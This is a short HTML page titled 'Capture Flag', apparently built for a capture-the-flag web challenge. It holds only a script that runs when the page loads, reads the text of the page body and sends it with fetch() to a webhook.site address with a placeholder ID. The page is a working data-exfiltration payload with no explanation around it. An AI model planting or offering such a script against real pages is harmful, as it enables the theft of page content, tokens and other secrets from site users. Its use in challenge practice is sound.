<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Capture Flag</title>
</head>
<body>
    <script>
        // Wait for the DOM to fully load
        document.addEventListener('DOMContentLoaded', function () {
            // Change the selector based on where the flag is displayed
            var flagElement = document.querySelector('body'); // or any specific selector that contains the flag
            if (flagElement) {
                var flag = flagElement.innerText || flagElement.textContent; // Capture the text
                fetch("https://webhook.site/YOUR_UNIQUE_ID?flag=" + encodeURIComponent(flag)); // Send it to webhook.site
            } else {
                console.error('Flag element not found.');
            }
        });
    </script>
</body>
</html>
